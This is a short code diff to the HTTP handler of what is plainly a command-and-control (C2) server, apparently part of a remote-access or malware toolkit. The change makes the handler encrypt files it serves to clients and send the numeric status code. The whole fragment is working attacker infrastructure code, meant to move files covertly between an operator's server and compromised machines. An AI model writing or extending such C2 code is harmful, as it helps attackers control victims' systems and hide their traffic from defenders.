@@ -91,11 +91,10 @@ class C2Handler(BaseHTTPRequestHandler):
         elif self.path.startswith(FILE_REQUEST):
             filepath = self.path.split(FILE_REQUEST)[1]
             filepath = cipher.decrypt(filepath.encode()).decode()
-
             try:
                 with open(f"{filepath}", "rb") as file_handle:
-                    self.http_response(HTTPStatusCode.OK)
-                    self.wfile.write(file_handle.read())
+                    self.http_response(HTTPStatusCode.OK.value)
+                    self.wfile.write(cipher.encrypt(file_handle.read()))
             except (FileNotFoundError, OSError):
                 print(f"{filepath} was not found on the c2 server.")
                 self.http_response(HTTPStatusCode.NOT_FOUND)
